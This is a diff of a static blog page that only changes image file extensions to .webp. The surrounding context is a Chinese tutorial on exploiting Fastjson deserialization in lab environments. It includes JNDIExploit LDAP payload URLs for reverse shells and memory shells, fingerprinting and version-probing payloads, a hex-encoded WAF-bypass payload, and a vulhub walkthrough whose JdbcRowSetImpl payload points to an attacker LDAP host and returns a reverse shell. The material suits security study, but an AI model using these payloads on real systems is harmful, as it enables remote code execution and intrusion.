@@ -48,7 +48,7 @@
             <div class="brand-logo">
                 <a href="/" class="waves-effect waves-light">
                     
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    <img src="/medias/logo.webp" class="logo-img" alt="LOGO">
                     
                     <span class="logo-span">Yang Hao&#39;s blog</span>
                 </a>
@@ -146,7 +146,7 @@
 
     <div class="mobile-head bg-color">
         
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        <img src="/medias/logo.webp" class="logo-img circle responsive-img">
         
         <div class="logo-name">Yang Hao&#39;s blog</div>
         <div class="logo-desc">
@@ -254,7 +254,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.webp')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -440,7 +440,7 @@
                 <h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h2><p>Fastjson 是阿里巴巴开源的一个高性能 JSON 库，广泛应用于 Java 应用中进行 JSON 数据的解析和序列化。然而，由于其功能强大且支持多种 Java 对象的自动反序列化，Fastjson 在历史上多次暴露出严重的安全漏洞，特别是反序列化漏洞。此类漏洞允许攻击者通过精心构造的恶意 JSON 数据包，实现对目标系统的远程代码执行（RCE），从而在未经授权的情况下控制受害者的服务器。本文通过学习<code>fastjson</code>的基础知识，整理了一些公开的Payload，并搭建实验环境进行测试。</p>
 <h2 id="2-Fastjson相关介绍"><a href="#2-Fastjson相关介绍" class="headerlink" title="2 Fastjson相关介绍"></a>2 Fastjson相关介绍</h2><p>Fastjson是阿里巴巴的开源JSON解析库，它是由Java语言编写的JSON处理器/解析器。Fastjson提供了一种快速、高效的方式来处理JSON数据，可以将Java对象转换为JSON格式的数据，也可以将JSON格式的数据转换为Java对象。Fastjson具有高性能和低内存占用的特点，在Java开发中被广泛应用于处理JSON数据。</p>
 <p>FastJson因为Auto功能存在缺陷，历史上出现过多次安全漏洞，目前官方针对<code>FastJson</code>的各种历史问题经过重构将其升级到了<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson2">fastjson2</a>，在fastjson2中提到升级的原因之一是安全性的提升:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240422111207276.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240422111207276.webp"></p>
 <p>fastjson2中完全删除了<code>autoType</code>白名单，且默认关闭<code>autoType</code>功能。在fastjson1项目中反序列化漏洞产生的根本原因就是对<code>autoType</code>功能利用和限制绕过，攻击者可以通过精心构造的类和数据包进行命令执行。</p>
 <h3 id="2-1-序列化和反序列化"><a href="#2-1-序列化和反序列化" class="headerlink" title="2.1 序列化和反序列化"></a>2.1 序列化和反序列化</h3><p>为了理解反序列化漏洞，先来解释下序列化和反序列化。在Java中，序列化是将对象转换为字节序列的过程，这些字节可以被保存到磁盘或数据库，也可以通过流进行发送，序列化通常用于通信（在多个主机之间共享对象）和持久性（将对象状态存储在文件或数据库中）。而从字节序列创建对象的反向过程则称为反序列化。在fastjson中使用序列化和反序列化进行对象和JSON字符串的转换如下:</p>
 <pre><code class="line-numbers language-java">import com.alibaba.fastjson.JSON;
@@ -472,7 +472,7 @@ public class Main {
 }
 </code></pre>
 <p>执行代码后，第一次输出将对象转为了JSON字符串，第二次将JSON字符串反序列化为了对象并输出了对象的属性:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423173312776.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423173312776.webp"></p>
 <p>FastJSON 在序列化和反序列化时，会根据 getter 和 setter 方法来操作对象的属性（在 Java 中，setter 和 getter 是一种常见的编程模式，即通过反射的方式对类的属性进行读取和设置操作），下面的示例可以验证这一点:</p>
 <pre><code class="line-numbers language-java">import com.alibaba.fastjson.JSON;
 public class Main {
@@ -523,7 +523,7 @@ public class Main {
     }
 }
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240424003548130.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240424003548130.webp"></p>
 <h3 id="2-2-Autotype功能"><a href="#2-2-Autotype功能" class="headerlink" title="2.2 Autotype功能"></a>2.2 Autotype功能</h3><p><code>fastjson</code> 的 <code>AutoType</code> 功能是在 1.2.22 版本引入的。<code>AutoType</code> 允许在反序列化过程中自动识别和实例化指定类型的对象，这是通过在 JSON 数据中嵌入类型信息来实现的。然而，这一功能也带来了安全风险，尤其是在未经验证的输入情况下，可能导致反序列化漏洞，允许攻击者执行任意代码。由于这些安全风险，后续版本开发者和安全研究人员对<code>AutoType</code>功能进行了多次修复与绕过修复的攻防对抗。</p>
 <p>为了理解<code>autotype</code>的作用，编写如下代码，代码定义了一个名为 <code>Person</code> 的静态内部类，以及一个名为 <code>City</code> 的接口和一个实现了 <code>City</code> 接口的静态内部类 <code>Home</code>，<code>fastjson</code>在对这样的类进行序列化和反序列化结果如下:</p>
 <pre><code>import com.alibaba.fastjson.JSON;
@@ -609,17 +609,17 @@ public class Main {
     }
 }
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240424010257053.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240424010257053.webp"></p>
 <p>序列化字符串中的<code>"city":{"cityname":"chengdu"}</code>应该是<code>Home</code>类型，但是<code>fastjson</code>并没有成功转换，抛出了异常。为了解决这个问题，<code>fastjson</code>引入了<code>autotype</code>功能，利用该功能在序列化时标记类对应的原始类型，指定具体的解析类:</p>
 <pre><code class="line-numbers language-java">import com.alibaba.fastjson.serializer.SerializerFeature;
 //使用 SerializerFeature.WriteClassName
 String jsonString = JSON.toJSONString(person, SerializerFeature.WriteClassName);
 </code></pre>
 <p>这样序列化的JSON字符串就会带上<code>@type</code>指定需要转换的类型:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240424093917809.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240424093917809.webp"></p>
 <p>当 autotype 功能启用时，Fastjson会尝试根据 JSON 字符串中的类型信息（即 @type 的值）来自动转换为相应的Java对象类型，同时 Fastjson 基于 setter/getter 的转换方式可以在转换类型时设置对象的参数，这就导致可以引入未经授权的类实例化、执行恶意代码或获取系统权限的安全风险。在FastJson漏洞的利用过程中一般是利用目标类执行JNDI注入、指定字节码加载、文件写入等。</p>
 <h3 id="2-3-parseObject和parse"><a href="#2-3-parseObject和parse" class="headerlink" title="2.3 parseObject和parse"></a>2.3 parseObject和parse</h3><p>在 Fastjson 中，有两种反序列化接口可供使用：<code>JSON.parse</code> 和 <code>JSON.parseObject</code>。其中，<code>JSON.parseObject</code> 会自动扫描类中的 getter 方法，并根据 JSON 字符串中的属性值自动匹配 setter 方法来设置对象的属性值。因此，使用 <code>JSON.parseObject</code> 方法可以方便地将 JSON 字符串转换为相应的 Java 对象，无需手动转换类型。相反，<code>JSON.parse</code> 方法不会自动扫描 getter 方法，而是将 JSON 字符串直接解析为一个 <code>JSONObject</code> 对象或其他 JSON 数据类型。因此，<code>JSON.parse</code> 方法返回的是一个 <code>Object</code> 类型的对象，如果需要将其转换为特定的 Java 对象类型，则需要手动进行类型转换。强制类型转换可能会导致 <code>ClassCastException</code> 异常。如下代码仅使用<code>JSON.parse</code>转换数据类型时会导致异常:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423232856916.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423232856916.webp"></p>
 <p>这时候需要手动对<code>JSON.parse</code>类型进行转换:</p>
 <pre><code>import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
@@ -675,11 +675,11 @@ public class Main {
     }
 }
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423234159608.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423234159608.webp"></p>
 <p>使用<code>JSON.parseObject()</code> 方法时则可以返回指定类型的 Java 对象:</p>
 <pre><code class="line-numbers language-java">Person person2 = JSON.parseObject(jsonString,Person.class);
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423234628481.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423234628481.webp"></p>
 <p>这是因为<code>JSON.parse</code>不自动扫描<code>getter/setter</code>，而<code>JSON.parseObject</code>在执行时会自动调用符合条件的函数(无参数的构造函数、符合条件的getter/setter函数)。<code>JSON.parse</code>在漏洞利用时相比<code>JSON.parseObject</code>有一些难度。不过在<code>fastjson</code>1.2.36版本以后可以利用<code>$ref</code>的方式来调用任意<code>getter</code>，可参考<a target="_blank" rel="noopener" href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6">一种利用$ref几乎任意getter触发的方法</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/HongYu012/article/details/123090337">浅谈fastjson反序列化漏洞_tojsonstring大小限制-CSDN博客</a>、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&amp;mid=2247486057&amp;idx=1&amp;sn=6799b8b77f058247705beaa6995dcb82&amp;chksm=9b7721bbac00a8adc3ca7b23590bcb7493fc93091eaf76efe4662b7d6f86068e38d20338c3c1&amp;mpshare=1&amp;scene=2&amp;srcid=1109kLt9Pm0fZdiqQ8zbB0IX&amp;sharer_sharetime=1667995572392&amp;sharer_shareid=917ce1404b071ce27556675ad135266f#rd">Java安全攻防之老版本Fastjson的一些不出网利用</a>中有关<code>$ref</code>的介绍。</p>
 <h3 id="2-4-JNDI注入简介"><a href="#2-4-JNDI注入简介" class="headerlink" title="2.4 JNDI注入简介"></a>2.4 JNDI注入简介</h3><p>在JAVA程序中，JNDI注入是在代码中存在可控的JNDI字符串的情况。这意味着攻击者可以控制JNDI名称，进而构造恶意的RMI（远程方法调用）或LDAP（轻量级目录访问协议）服务端，导致远程服务器加载恶意类，最终实现远程代码执行。恶意类即对<code>JAVA</code>源码进行编译生成的<code>.class</code>文件，除了使用工具现有的恶意类，也可以根据需要自行开发代码进行利用。</p>
 <p>JNDI 注入攻击通常涉及识别可控的 JNDI 注入点( <code>lookup()</code>过程中寻找类加载)、部署恶意的 RMI 服务器并编写恶意的类、构造恶意的 JNDI 引用，并最终触发漏洞以执行恶意操作。</p>
@@ -733,7 +733,7 @@ https://github.com/kezibei/Urldns
 https://www.cnblogs.com/bitterz/p/15946406.html
 </code></pre>
 <h3 id="2-5-漏洞相关工具介绍"><a href="#2-5-漏洞相关工具介绍" class="headerlink" title="2.5 漏洞相关工具介绍"></a>2.5 漏洞相关工具介绍</h3><h4 id="2-5-1-JNDI-Injection-Exploit-Plus"><a href="#2-5-1-JNDI-Injection-Exploit-Plus" class="headerlink" title="2.5.1 JNDI-Injection-Exploit-Plus"></a>2.5.1 <strong><a target="_blank" rel="noopener" href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus">JNDI-Injection-Exploit-Plus</a></strong></h4><p><code>JNDI-Injection-Exploit-Plus</code>是一款JNDI注入利用工具，可以生成JNDI链接并启动后端相关服务。通过这个工具也可以看到其包括了上文介绍的几种类型的Payload，主要利用<code>Remote JNDI Reference Payload</code>、<code>Local JNDI Reference Payload</code>和本地反序列化利用链三种方式进行命令执行:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513150523571.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513150523571.webp"></p>
 <h4 id="2-5-2-JNDIExploit"><a href="#2-5-2-JNDIExploit" class="headerlink" title="2.5.2 JNDIExploit"></a>2.5.2 <strong><a target="_blank" rel="noopener" href="https://github.com/WhiteHSBG/JNDIExploit">JNDIExploit</a></strong></h4><p><code>JNDIExploit</code>  是一款用于 <code>JNDI注入</code> 利用的工具，包含命令执行、命令执行回显、反弹Shell、内存马等多种利用方式的载荷，可以使用<code>java -jar JNDIExploit.jar -u</code>查看载荷细节:</p>
 <pre><code>[+] Basic Queries: ldap://0.0.0.0:1389/Basic/[PayloadType]/[Params], e.g.
 ldap://0.0.0.0:1389/Basic/Dnslog/[domain]
@@ -795,10 +795,10 @@ ldap://0.0.0.0:1389/WebsphereBypass/Upload/WebsphereMemshell
 ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
 </code></pre>
 <h4 id="2-5-3-JNDIBypass"><a href="#2-5-3-JNDIBypass" class="headerlink" title="2.5.3 JNDIBypass"></a>2.5.3 <strong>JNDIBypass</strong></h4><p>该工具来自<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/65e845a989fd2907751310b9bbc74ab589b2e96a/1245-jdk8u342/write-up.md">FastJsonParty/1245-jdk8u342</a>，其中提供了该<code>JNDIBypass</code>工具。该工具是<code>fastjson</code>原生反序列化中<code>JNDI</code>利用工具，支持内存命令执行、冰蝎3内存马等利用方法:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516192516896.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516192516896.webp"></p>
 <p>其中命令执行内存马使用方法为:<code>ip:port/shell?cmd=whoami</code>。冰蝎v3内存马连接地址: <code>ip:port/behinder</code>，连接密码为<code>rebeyond</code>。</p>
 <h4 id="2-5-4-Java-memshell-generator-JMG"><a href="#2-5-4-Java-memshell-generator-JMG" class="headerlink" title="2.5.4 Java-memshell-generator(JMG)"></a>2.5.4 <a target="_blank" rel="noopener" href="https://github.com/pen4uin/java-memshell-generator">Java-memshell-generator(JMG)</a></h4><p><code>Java-memshell-generator</code>是一款可以自定义生成内存马载荷的工具又名<code>JMG</code>，可以通过该工具生成各种类型的内存马载荷，在<code>fastjson</code>漏洞利用中根据不同利用类型可以很方便生成多种输出格式的内存马载荷:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240818214006317.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240818214006317.webp"></p>
 <h2 id="3-FastJson-Payload"><a href="#3-FastJson-Payload" class="headerlink" title="3 FastJson Payload"></a>3 FastJson Payload</h2><h3 id="3-1-0x03-1-检测是否为FastJson"><a href="#3-1-0x03-1-检测是否为FastJson" class="headerlink" title="3.1 0x03.1 检测是否为FastJson"></a>3.1 0x03.1 检测是否为FastJson</h3><p>这里主要是判断目标使用的是<code>fastjson</code>还是其他类型的解析库，主要是利用fastjson的一些特性进行判断，假设请求JSON如下:</p>
 <pre><code class="line-numbers language-json">{
     "age":20,
@@ -808,18 +808,18 @@ ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../.
 <h4 id="3-1-1-根据报错信息判断"><a href="#3-1-1-根据报错信息判断" class="headerlink" title="3.1.1 根据报错信息判断"></a>3.1.1 <strong>根据报错信息判断</strong></h4><pre><code class="line-numbers language-json">// 如果目标服务器存在报错信息，可以破坏JSON结构，触发报错
 {"age":20,"name":"Bob"
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426161520794.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426161520794.webp"></p>
 <pre><code class="line-numbers language-json">// 利用@type功能引发错误,可检测autotype是否开启
 {"@type":"whatever"}
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525154046101.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525154046101.webp"></p>
 <h4 id="3-1-2-根据解析变化判断"><a href="#3-1-2-根据解析变化判断" class="headerlink" title="3.1.2 根据解析变化判断"></a>3.1.2 根据解析变化判断</h4><pre><code class="line-numbers language-json">{"a":new a(1),"b":x'11',/*\*\/"c":Set[{}{}],"d":"\u0000\x00"}
 
 {"ext":"blue","name":{"$ref":"$.ext"}}
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427171251495.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427171251495.webp"></p>
 <p>在靶场中只观察到<code>Set[{}{}]</code>可以解析成功：</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427171339452.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427171339452.webp"></p>
 <h4 id="3-1-3-根据带外信息判断"><a href="#3-1-3-根据带外信息判断" class="headerlink" title="3.1.3 根据带外信息判断"></a>3.1.3 <strong>根据带外信息判断</strong></h4><pre><code class="line-numbers language-json">// 不出网时可以利用网络请求是否延时进行判断
 // java.net.URL
 {"@type":"java.net.URL","val":"http://dnslog"}
@@ -844,7 +844,7 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
 <p>在进行Payload测试时，一般可以将Payload插入到值中:</p>
 <pre><code class="line-numbers language-json">{"age":25,"name":{"@type":"java.net.InetSocketAddress"{"address":,"val":"x.x.x"}}}
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426174659240.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426174659240.webp"></p>
 <h4 id="3-1-4-区别jackson和fastjson"><a href="#3-1-4-区别jackson和fastjson" class="headerlink" title="3.1.4 区别jackson和fastjson"></a>3.1.4 <strong>区别jackson和fastjson</strong></h4><pre><code>// 多余的类成员: 添加一个键值 test，jackson会报错，fastjson不会
 {"age":20,"name":"Bob","test":1}
 
@@ -863,7 +863,7 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
     "name":'Bob'
 }
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426161630309.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426161630309.webp"></p>
 <h3 id="3-2-0x03-2-FastJson版本探测"><a href="#3-2-0x03-2-FastJson版本探测" class="headerlink" title="3.2 0x03.2 FastJson版本探测"></a>3.2 0x03.2 FastJson版本探测</h3><h4 id="3-2-1-报错信息判断"><a href="#3-2-1-报错信息判断" class="headerlink" title="3.2.1 报错信息判断"></a>3.2.1 报错信息判断</h4><pre><code class="line-numbers language-json">// 1
 {"@type": "java.lang.AutoCloseable"
 
@@ -873,9 +873,9 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
 // 3
 a 
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426182956211.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426182956211.webp"></p>
 <p>1.2.77~1.2.80的版本信息显示会有误，都是返回1.2.76，实际靶场环境是1.2.80:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426182934272.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426182934272.webp"></p>
 <h4 id="3-2-2-是否报错判断"><a href="#3-2-2-是否报错判断" class="headerlink" title="3.2.2 是否报错判断"></a>3.2.2 是否报错判断</h4><pre><code class="line-numbers language-json">//Payload1: 不报错:1.2.24 / 1.2.83，报错: 1.2.25-1.2.80
 {"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}
 
@@ -889,11 +889,11 @@ a
 {"zero": {"@type": "com.sun.rowset.JdbcRowSetImpl"}}
 </code></pre>
 <p>靶场环境中有一个环境无法根据报错信息得到版本，那么根据不报错Payload进行判断，先使用<code>Payload1</code>，发现没报错，那么可能是<code>1.2.24</code>或<code>1.2.83</code>:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427162030667.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427162030667.webp"></p>
 <p>再使用<code>Payload2</code>进行测试，还是没有报错，那么可能就是<code>1.2.24</code>:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427162125919.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427162125919.webp"></p>
 <p>使用<code>Payload4</code>进行测试，发现依然不报错，那么可以初步确定该环境为<code>1.2.24</code>，从靶场中提取出jar包，发现确实是<code>1.2.24</code>：</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427162407866.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427162407866.webp"></p>
 <h4 id="3-2-3-带外信息判断"><a href="#3-2-3-带外信息判断" class="headerlink" title="3.2.3 带外信息判断"></a>3.2.3 <strong>带外信息判断</strong></h4><p>这些方法可能有一些不是很准确，但是应该也可以结合起来判断目标版本。测试代码如下:</p>
 <pre><code class="line-numbers language-json">import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.parser.ParserConfig;
@@ -1156,9 +1156,9 @@ java.util.random.RandomGeneratorFactory  // JDK 17
 }
 </code></pre>
 <p><code>org.springframework.web.bind.annotation.RequestMapping</code>类存在时：</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427234745974.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427234745974.webp"></p>
 <p>不存在类的情况:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427234835868.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427234835868.webp"></p>
 <h4 id="3-3-2-通过类转换异常判断"><a href="#3-3-2-通过类转换异常判断" class="headerlink" title="3.3.2 通过类转换异常判断"></a>3.3.2 通过类转换异常判断</h4><p>通过使用 <code>java.lang.Character</code>对类进行转换，类存在时转换将抛出异常:</p>
 <pre><code class="line-numbers language-json">{
   "x": {
@@ -1170,9 +1170,9 @@ java.util.random.RandomGeneratorFactory  // JDK 17
 {"@type": "java.lang.Character"{"@type": "java.lang.Class","val": "com.mysql.jdbc.Driver"}
 </code></pre>
 <p><code>org.apache.catalina.startup.Tomcat</code>类存在时，转换失败将抛出异常:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427234924124.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427234924124.webp"></p>
 <p><code>com.mysql.jdbc.Driver</code>类不存在时返回空:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427235139838.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427235139838.webp"></p>
 <h4 id="3-3-3-通过带外信息判断"><a href="#3-3-3-通过带外信息判断" class="headerlink" title="3.3.3 通过带外信息判断"></a>3.3.3 通过带外信息判断</h4><p>通过使用 带外请求来探测依赖库，当存在依赖时<code>DNSLOG</code>中会显示类信息:</p>
 <pre><code class="line-numbers language-json">{"@type":"java.net.Inet4Address",
    "val":{"@type":"java.lang.String"
@@ -1185,7 +1185,7 @@ java.util.random.RandomGeneratorFactory  // JDK 17
 }}}}}}
 </code></pre>
 <p>在靶机环境中未能实现<code>DNSLOG</code>检测，因为<code>DNS</code>请求没法支持<code>{}</code>符号，会抛出异常（需要对方为<code>mac</code>环境且<code>dnslog</code>平台支持特殊符号）,但是也可以根据异常检测到存在类(存在类时才会发起<code>DNS</code>解析，这时候就抛出了<code>deserialize inet adress error</code>异常):</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240428000716121.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240428000716121.webp"></p>
 <h3 id="3-4-0x03-4-WAF绕过"><a href="#3-4-0x03-4-WAF绕过" class="headerlink" title="3.4 0x03.4 WAF绕过"></a>3.4 0x03.4 WAF绕过</h3><p><strong>1.Unicode与Hex编码</strong></p>
 <pre><code class="line-numbers language-json">{"\x40\u0074\u0079\u0070\u0065":"\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c","dataSourceName":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
 
@@ -2672,13 +2672,13 @@ docker create -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock  -e VUL_IP=1
 docker start a6ca90309735
 </code></pre>
 <p>如本文进行fastjson漏洞环境的搭建，在一键同步后搜索fastjson的漏洞环境进行下载，然后到首页启动靶场:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426145813411.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426145813411.webp"></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">vulhub</a>靶场的环境也可以很方便的导入<code>vulfocus</code>，从<code>docker-compose.yml</code>中复制镜像名称：</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513110158960.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513110158960.webp"></p>
 <p>拉取成功后会自动更新镜像列表(注意不要填错镜像地址，否则会卡在下载状态):</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513110210867.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513110210867.webp"></p>
 <h3 id="4-1-fastjson-1-2-24-vulhub"><a href="#4-1-fastjson-1-2-24-vulhub" class="headerlink" title="4.1 fastjson-1.2.24-vulhub"></a>4.1 fastjson-1.2.24-vulhub</h3><p>这是使用<code>vulhub</code>中的<code>fastjson-1.2.24</code>环境，因为这个环境里没有太多可利用的依赖，所以主要利用方式是使用<code>JNDI</code>注入。在burp中先将GET请求转为POST请求，修改<code>Content-Type</code>为<code>application/json</code>，即可进行fastjson漏洞测试:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513152805106.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513152805106.webp"></p>
 <p><strong>版本判断</strong>:通过是否报错初步判断版本为<code>1.2.24</code>:</p>
 <pre><code class="line-numbers language-json">//不报错:1.2.24 / 1.2.83，报错: 1.2.25-1.2.80
 {"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}
@@ -2728,47 +2728,47 @@ https://b1ngz.github.io/java-os-command-injection-note/
 <pre><code class="line-numbers language-json">{"age":25,"name":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x.x.x.x:1389/remoteExploit8", "autoCommit":true}
 }
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513204239800.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513204239800.webp"></p>
 <p>此时在服务器上接收到了目标环境的反弹<code>shell</code>:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513204111525.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513204111525.webp"></p>
